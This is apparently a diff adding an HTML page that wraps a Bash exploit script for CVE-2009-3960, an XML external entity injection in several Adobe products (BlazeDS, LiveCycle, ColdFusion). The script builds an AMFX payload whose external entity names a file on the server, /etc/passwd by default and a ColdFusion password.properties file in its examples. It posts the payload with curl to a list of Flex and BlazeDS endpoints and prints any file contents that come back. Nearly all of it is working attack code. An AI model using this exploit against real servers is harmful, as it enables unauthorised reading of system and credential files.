@@ -1,0 +1,233 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>XXE Tester</title>
+</head><body>#!/bin/bash<br/>
+#<br/>
+# Exploit Title: Adobe XML Injection file content disclosure<br/>
+# Date: 07-04-2017<br/>
+# Exploit Author: Thomas Sluyter<br/>
+# Website: https://www.kilala.nl<br/>
+# Vendor Homepage: http://www.adobe.com/support/security/bulletins/apsb10-05.html<br/>
+# Version: Multiple Adobe products<br/>
+# Tested on: Windows Server 2003, ColdFusion 8.0 Enterprise<br/>
+# CVE : 2009-3960<br/>
+#<br/>
+# Shell script that let's you exploit a known XML injection vulnerability<br/>
+# in a number of Adobe products, allowing you to read files that are otherwise<br/>
+# inaccessible. In Metasploit, this is achieved with auxiliary:scanner:adobe_xml_inject<br/>
+# This script is a Bash implementation of the PoC multiple/dos/11529.txt.<br/>
+#<br/>
+# According to the original Metasploit code, this attack works with:<br/>
+# &nbsp; "Multiple Adobe Products: BlazeDS 3.2 and earlier versions,<br/>
+# &nbsp; &nbsp;LiveCycle 9.0, 8.2.1, and 8.0.1, LiveCycle Data Services 3.0, 2.6.1,<br/>
+# &nbsp; &nbsp;and 2.5.1, Flex Data Services 2.0.1, ColdFusion 9.0, 8.0.1, 8.0, and 7.0.2"<br/>
+#<br/>
+<br/>
+<br/>
+PROGNAME="$(basename $0)" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # This script<br/>
+TIMESTAMP=$(date +%y%m%d%H%M) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # Used for scratchfiles<br/>
+SCRATCHFILE="/tmp/${PROGNAME}.${TIMESTAMP}" &nbsp; &nbsp; # Used as generic scratchfile<br/>
+EXITCODE="0" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# Assume success, changes on errors<br/>
+CURL="/usr/bin/curl" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# Other locations are detected with "which"<br/>
+<br/>
+SSL="0" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # Overridden by -s<br/>
+DEBUG="0" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # Overridden by -d<br/>
+BREAKFOUND="0" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# Overridden by -b<br/>
+TARGETHOST="" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # Overridden by -h<br/>
+TARGETPORT="8400" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # Overridden by -p<br/>
+READFILE="/etc/passwd" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# Overridden by -f<br/>
+<br/>
+<br/>
+################################## OVERHEAD SECTION<br/>
+#<br/>
+# Various functions for overhead purposes.<br/>
+#<br/>
+<br/>
+# Defining our own logger function, so we can switch between stdout and syslog.<br/>
+logger() {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; LEVEL="$1"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; MESSAGE="$2"<br/>
+<br/>
+&nbsp; &nbsp; # You may switch the following two, if you need to log to syslog.<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; #[[ ${DEBUG} -gt 0 ]] &amp;&amp; echo "${LEVEL} $MESSAGE" || /usr/bin/logger -p ${LEVEL} "$MESSAGE"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; [[ ${DEBUG} -gt 0 ]] &amp;&amp; echo "${LEVEL} $MESSAGE" || echo "${LEVEL} $MESSAGE"<br/>
+}<br/>
+<br/>
+<br/>
+ExitCleanup() {<br/>
+&nbsp; &nbsp; EXITCODE=${1}<br/>
+&nbsp; &nbsp; rm -f ${SCRATCHFILE}* &gt;/dev/null 2&gt;&amp;1<br/>
+&nbsp; &nbsp; echo ""<br/>
+&nbsp; &nbsp; exit ${EXITCODE}<br/>
+}<br/>
+<br/>
+<br/>
+# Many thanks to http://www.linuxjournal.com/content/validating-ip-address-bash-script<br/>
+ValidIP() {<br/>
+&nbsp; &nbsp; local IP=${1}<br/>
+&nbsp; &nbsp; local STAT=1<br/>
+<br/>
+&nbsp; &nbsp; if [[ ${IP} =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]<br/>
+&nbsp; &nbsp; then<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; OIFS=$IFS; IFS='.'<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; IP=(${IP})<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; IFS=$OIFS<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; [[ (${IP[0]} -le 255) &amp;&amp; (${IP[1]} -le 255) &amp;&amp; (${IP[2]} -le 255) &amp;&amp; (${IP[3]} -le 255) ]]<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; stat=$?<br/>
+&nbsp; &nbsp; fi<br/>
+&nbsp; &nbsp; return $stat<br/>
+}<br/>
+<br/>
+<br/>
+# Function to output help information.<br/>
+show-help() {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; echo ""<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; cat &lt;&lt; EOF<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ${PROGNAME} [-?] [-d] [-s] [-b] -h host [-p port] [-f file]<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp;-? &nbsp; Show this help message.<br/>
+&nbsp; &nbsp; &nbsp; &nbsp;-d &nbsp; Debug mode, outputs more kruft on stdout.<br/>
+&nbsp; &nbsp; &nbsp; &nbsp;-s &nbsp; Use SSL / HTTPS, instead of HTTP.<br/>
+&nbsp; &nbsp; &nbsp; &nbsp;-b &nbsp; Break on the first valid answer found.<br/>
+&nbsp; &nbsp; &nbsp; &nbsp;-h &nbsp; Target host<br/>
+&nbsp; &nbsp; &nbsp; &nbsp;-p &nbsp; Target port, defaults to 8400.<br/>
+&nbsp; &nbsp; &nbsp; &nbsp;-f &nbsp; Full path to file to grab, defaults to /etc/passwd.<br/>
+<br/>
+&nbsp; &nbsp; This script exploits a known vulnerability in a set of Adobe applications. Using one<br/>
+&nbsp; &nbsp; of a few possible URLs on the target host (-h) we attempt to read a file (-f) that is<br/>
+&nbsp; &nbsp; normally inaccessible.<br/>
+<br/>
+&nbsp; &nbsp; NOTE: Windows paths use \\, so be sure to properly escape them when using -f! For example:<br/>
+&nbsp; &nbsp; ${PROGNAME} -h 192.168.1.20 -f c:\\\\coldfusion8\\\\lib\\\\password.properties<br/>
+&nbsp; &nbsp; ${PROGNAME} -h 192.168.1.20 -f 'c:\\coldfusion8\\lib\\password.properties'<br/>
+<br/>
+&nbsp; &nbsp; This script relies on CURL, so please have it in your PATH.<br/>
+<br/>
+EOF<br/>
+}<br/>
+<br/>
+<br/>
+# Parsing and verifying the passed parameters.<br/>
+OPTIND=1<br/>
+while getopts "?dsbh:p:f:" opt; do<br/>
+&nbsp; &nbsp; case "$opt" in<br/>
+&nbsp; &nbsp; \?) show-help; ExitCleanup 0 ;;<br/>
+&nbsp; &nbsp; &nbsp;d) DEBUG="1" ;;<br/>
+&nbsp; &nbsp; &nbsp;s) SSL="1" ;;<br/>
+&nbsp; &nbsp; &nbsp;b) BREAKFOUND="1" ;;<br/>
+&nbsp; &nbsp; &nbsp;h) [[ -z ${OPTARG} ]] &amp;&amp; (show-help; ExitCleanup 1)<br/>
+&nbsp; &nbsp; ValidIP ${OPTARG}; if [[ $? -eq 0 ]]<br/>
+&nbsp; &nbsp; then TARGETHOST=${OPTARG}<br/>
+&nbsp; &nbsp; else TARGETHOST=$(nslookup ${OPTARG} | grep ^Name | awk '{print $2}')<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[[ $? -gt 0 ]] &amp;&amp; (logger ERROR "Target host ${TARGETHOST} not found in DNS."; ExitCleanup 1)<br/>
+&nbsp; &nbsp; fi ;;<br/>
+&nbsp; &nbsp; &nbsp;p) [[ -z ${OPTARG} ]] &amp;&amp; (show-help; ExitCleanup 1)<br/>
+&nbsp; &nbsp; if [[ ! -z $(echo ${OPTARG} | tr -d '[:alnum:]') ]]<br/>
+&nbsp; &nbsp; then logger ERROR "Target port ${OPTARG} is incorrect."; ExitCleanup 1<br/>
+&nbsp; &nbsp; else TARGETPORT=${OPTARG}<br/>
+&nbsp; &nbsp; fi ;;<br/>
+&nbsp; &nbsp; &nbsp;f) [[ -z ${OPTARG} ]] &amp;&amp; (show-help; ExitCleanup 1)<br/>
+&nbsp; &nbsp; if [[ (-z $(echo ${OPTARG} | grep ^\/)) &amp;&amp; (-z $(echo ${OPTARG} | grep ^[a-Z]:)) ]]<br/>
+&nbsp; &nbsp; then logger ERROR "File is NOT specified with full Unix or Windows path."; ExitCleanup 1<br/>
+&nbsp; &nbsp; else READFILE=${OPTARG}<br/>
+&nbsp; &nbsp; fi ;;<br/>
+&nbsp; &nbsp; &nbsp;*) show-help; ExitCleanup 0 ;;<br/>
+&nbsp; &nbsp; esac<br/>
+done<br/>
+<br/>
+[[ $(which curl) ]] &amp;&amp; CURL=$(which curl) || (logger ERROR "CURL was not found."; ExitCleanup 1)<br/>
+[[ -z ${TARGETHOST} ]] &amp;&amp; (logger ERROR "Target host was not set."; ExitCleanup 1)<br/>
+<br/>
+[[ ${DEBUG} -gt 0 ]] &amp;&amp; logger DEBUG "Proceeding with host/port/file: ${TARGETHOST},${TARGETPORT},${READFILE}."<br/>
+<br/>
+<br/>
+################################## GETTING TO WORK<br/>
+#<br/>
+#<br/>
+<br/>
+PATHLIST=("/flex2gateway/" "/flex2gateway/http" "/flex2gateway/httpsecure" \<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "/flex2gateway/cfamfpolling" "/flex2gateway/amf" "/flex2gateway/amfpolling" \<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "/messagebroker/http" "/messagebroker/httpsecure" "/blazeds/messagebroker/http" \<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "/blazeds/messagebroker/httpsecure" "/samples/messagebroker/http" \<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "/samples/messagebroker/httpsecure" "/lcds/messagebroker/http" \<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "/lcds/messagebroker/httpsecure" "/lcds-samples/messagebroker/http" \<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "/lcds-samples/messagebroker/httpsecure")<br/>
+<br/>
+echo "&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;" &gt; ${SCRATCHFILE}<br/>
+echo "&lt;!DOCTYPE test [ &lt;!ENTITY x3 SYSTEM \"${READFILE}\"&gt; ]&gt;" &gt;&gt; ${SCRATCHFILE}<br/>
+echo "&lt;amfx ver=\"3\" xmlns=\"http://www.macromedia.com/2005/amfx\"&gt;" &gt;&gt; ${SCRATCHFILE}<br/>
+echo "&lt;body&gt;&lt;object type=\"flex.messaging.messages.CommandMessage\"&gt;&lt;traits&gt;" &gt;&gt; ${SCRATCHFILE}<br/>
+echo "&lt;string&gt;body&lt;/string&gt;&lt;string&gt;clientId&lt;/string&gt;&lt;string&gt;correlationId&lt;/string&gt;&lt;string&gt;destination&lt;/string&gt;" &gt;&gt; ${SCRATCHFILE}<br/>
+echo "&lt;string&gt;headers&lt;/string&gt;&lt;string&gt;messageId&lt;/string&gt;&lt;string&gt;operation&lt;/string&gt;&lt;string&gt;timestamp&lt;/string&gt;" &gt;&gt; ${SCRATCHFILE}<br/>
+echo "&lt;string&gt;timeToLive&lt;/string&gt;&lt;/traits&gt;&lt;object&gt;&lt;traits /&gt;&lt;/object&gt;&lt;null /&gt;&lt;string /&gt;&lt;string /&gt;&lt;object&gt;" &gt;&gt; ${SCRATCHFILE}<br/>
+echo "&lt;traits&gt;&lt;string&gt;DSId&lt;/string&gt;&lt;string&gt;DSMessagingVersion&lt;/string&gt;&lt;/traits&gt;&lt;string&gt;nil&lt;/string&gt;" &gt;&gt; ${SCRATCHFILE}<br/>
+echo "&lt;int&gt;1&lt;/int&gt;&lt;/object&gt;&lt;string&gt;&amp;x3;&lt;/string&gt;&lt;int&gt;5&lt;/int&gt;&lt;int&gt;0&lt;/int&gt;&lt;int&gt;0&lt;/int&gt;&lt;/object&gt;&lt;/body&gt;&lt;/amfx&gt;" &gt;&gt; ${SCRATCHFILE}<br/>
+<br/>
+if [[ ${DEBUG} -gt 0 ]]<br/>
+then<br/>
+&nbsp; &nbsp;logger DEBUG "XML file sent to target host reads as follows:"<br/>
+&nbsp; &nbsp;echo "======================================"<br/>
+&nbsp; &nbsp;cat ${SCRATCHFILE}<br/>
+&nbsp; &nbsp;echo "======================================"<br/>
+&nbsp; &nbsp;echo ""<br/>
+fi<br/>
+<br/>
+let CONTENTLENGTH=$(wc -c ${SCRATCHFILE} | awk '{print $1}')-1<br/>
+<br/>
+for ADOBEPATH in "${PATHLIST[@]}"<br/>
+do<br/>
+&nbsp; &nbsp;[[ ${SSL} -gt 0 ]] &amp;&amp; PROTOCOL="https" || PROTOCOL="http"<br/>
+&nbsp; &nbsp;URI="${PROTOCOL}://${TARGETHOST}:${TARGETPORT}${ADOBEPATH}"<br/>
+<br/>
+&nbsp; &nbsp;[[ ${DEBUG} -gt 0 ]] &amp;&amp; logger DEBUG "Proceeding with URI: ${URI}"<br/>
+<br/>
+&nbsp; &nbsp;# Header contents based on a tcpdump capture of original exploit being<br/>
+&nbsp; &nbsp;# run from Metasploit.<br/>
+&nbsp; &nbsp;HEADER="-H \"Host: ${TARGETHOST}\" -H \"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\" -H \"Content-Type: application/x-www-form-urlencoded\" -H \"Content-Length: ${CONTENTLENGTH}\""<br/>
+<br/>
+&nbsp; &nbsp;CURLPOST="${CURL} -X POST -k -s --http1.1 ${HEADER} -w \"%{http_code}\" -d @- ${URI}"<br/>
+<br/>
+&nbsp; &nbsp;[[ ${DEBUG} -gt 0 ]] &amp;&amp; logger DEBUG "Using this CURL command: ${CURLPOST}"<br/>
+<br/>
+&nbsp; &nbsp;# The tr command dikes out any non-ASCII characters which might mess with output.<br/>
+&nbsp; &nbsp;CURLOUTPUT=$(cat ${SCRATCHFILE} | ${CURLPOST} | tr -cd '\11\12\15\40-\176' 2&gt;&amp;1)<br/>
+<br/>
+&nbsp; &nbsp;# Output is pretty garbled and the HTTP return code is enclosed in double quotes.<br/>
+&nbsp; &nbsp;# I need to grab the last 5 chars (includes NULL EOF) and remove the ".<br/>
+&nbsp; &nbsp;CURLCODE=$(echo ${CURLOUTPUT} | tail -c5 | tr -cd [:digit:])<br/>
+<br/>
+&nbsp; &nbsp;if [[ ${DEBUG} -gt 0 ]]<br/>
+&nbsp; &nbsp;then<br/>
+&nbsp; &nbsp; logger DEBUG "CURL was given this HTTP return code: ${CURLCODE}."<br/>
+&nbsp; &nbsp; logger DEBUG "Output from CURL reads as follows:"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; echo "======================================"<br/>
+&nbsp; &nbsp; echo "${CURLOUTPUT}"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; echo "======================================"<br/>
+&nbsp; &nbsp; echo ""<br/>
+&nbsp; &nbsp;fi<br/>
+<br/>
+&nbsp; &nbsp;logger INFO "${CURLCODE} for ${URI}"<br/>
+<br/>
+&nbsp; &nbsp;if [[ (${CURLCODE} -eq 200) &amp;&amp; (! -z $(echo ${CURLOUTPUT} | grep "&lt;?xml version=")) ]]<br/>
+&nbsp; &nbsp;then<br/>
+&nbsp; &nbsp; echo "Read from ${URI}:"<br/>
+&nbsp; &nbsp; echo "${CURLOUTPUT}" | sed 's/^[^&lt;]*&lt;/&lt;/'<br/>
+&nbsp; &nbsp; [[ ${BREAKFOUND} -gt 0 ]] &amp;&amp; ExitCleanup 0<br/>
+&nbsp; &nbsp;fi<br/>
+<br/>
+&nbsp; &nbsp;if [[ ${DEBUG} -gt 0 ]]<br/>
+&nbsp; &nbsp;then<br/>
+&nbsp; &nbsp; echo -e "\nReady to continue with the next URI? [y/n]: \c"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; read READY<br/>
+&nbsp; &nbsp; case ${READY} in<br/>
+&nbsp; &nbsp; &nbsp; &nbsp;y|Y|yes) logger DEBUG "Moving to next URI."; echo "" ;;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp;*) logger DEBUG "Aborting..."; ExitCleanup 1 ;;<br/>
+&nbsp; &nbsp; esac<br/>
+&nbsp; &nbsp;fi<br/>
+done<br/>
+<br/>
+<br/>
+ExitCleanup 0<br/>
+</body></html>
